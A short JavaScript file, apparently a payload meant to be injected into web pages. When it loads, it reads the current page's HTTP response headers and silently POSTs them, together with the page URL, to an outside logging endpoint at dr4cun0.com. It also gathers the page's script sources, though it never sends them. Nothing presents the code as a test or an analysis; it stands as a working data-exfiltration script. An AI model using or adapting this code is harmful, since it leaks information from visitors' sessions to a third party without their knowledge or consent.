function getHeader() {
	var req = new XMLHttpRequest();
	req.open("GET", document.location, false);
	req.send(null);
	var headers = req.getAllResponseHeaders().toLowerCase();
	//alert(headers);
	sendRequest(headers);
}
function sendRequest(headers) {
				

		//var source = document.body.parentNode.innerHTML;
		var data = "";
		for(var i = 0; i < document.getElementsByTagName('script').length; i++) {
			data += document.getElementsByTagName('script')[i].src + "\n";
		}
		var xmlhttp = new XMLHttpRequest();
		xmlhttp.onreadystatechange = function() {
        if (xmlhttp.readyState == XMLHttpRequest.DONE ) {
           if (xmlhttp.status == 200) {
               //document.getElementById("myDiv").innerHTML = xmlhttp.responseText;
               //setTimeout(sendRequest(headers, arr, arr.length, (thisreqno + 1)), 5000);
	           }
	        }
	    };
	
	    xmlhttp.open("POST", "https://dr4cun0.com/logger/", true);
	    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	    xmlhttp.send("headers=" + encodeURI(headers) + "&location=" + encodeURI(document.location));
	    
	
}

getHeader();